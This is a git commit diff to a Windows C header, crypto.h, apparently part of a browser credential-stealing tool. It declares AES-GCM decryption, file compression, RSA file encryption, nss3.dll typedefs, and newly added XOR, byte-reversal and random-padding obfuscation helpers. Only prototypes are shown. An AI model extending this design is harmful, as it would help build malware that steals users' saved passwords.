3ad771df931693e3973f0cf55c84700a94ffe53f
UnknownWebPT <exomsecowner@gmail.com>
2024-10-21 23:25:49 +0200

    Update crypto.h

--- include/crypto.h
+++ include/crypto.h
@@ -1,13 +1,21 @@
 #ifndef CRYPTO_H
 #define CRYPTO_H
-
 #include <windows.h>
 #include <unistd.h>
+#include <time.h>
+
+extern unsigned char PublicKey[];
 int Base64DecodingFunc(const char *input, char **outputDec, DWORD *outputDecSize);
 int Base64EncodingFunc(const BYTE *inputBin, DWORD inputBinSize, char *outputB64, DWORD outputB64Size);
 NTSTATUS AES_256_GCM(const BYTE *encryptedData, ULONG encryptedDataLength, const BYTE *aad, ULONG aadLength, const BYTE *iv, ULONG ivLength, const BYTE *authTag, ULONG authTagLength, const BYTE *key, ULONG keyLength, BYTE *decryptedData, ULONG decryptedDataLength);
 int CompressFile(const WCHAR **Files, size_t numFiles, const WCHAR *OutputPath);
 int RSAEncrypt(char *file, char *fileOut);
+char *BizFumEncodingDecode(char *Input);
+void Reverse(unsigned char *data, int len);
+void XOR(char *input, char *output, const char *key, int length);
+void RemoveBytes(unsigned char *ByteArr, int ByteArrLength);
+void AddRandomBytes(unsigned char *input, size_t length);
+
 
 // Typedefs for nss3.dll calls.
 typedef enum
